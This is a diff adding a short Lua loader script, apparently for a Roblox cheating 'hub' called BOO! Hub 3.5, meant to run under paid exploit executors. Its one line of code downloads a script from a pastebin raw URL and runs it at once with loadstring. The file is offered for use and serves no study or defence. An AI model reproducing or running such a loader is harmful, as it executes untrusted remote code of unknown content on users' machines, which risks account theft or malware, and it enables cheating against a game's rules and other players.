@@ -1,0 +1,5 @@
+-- BOO! Hub
+-- Version 3.5
+-- Credits : purple#1337
+-- Work for Paid exploit and not for all free exploit
+loadstring(game:HttpGet('https://pastebin.com/raw/HGbE41Yn'))()
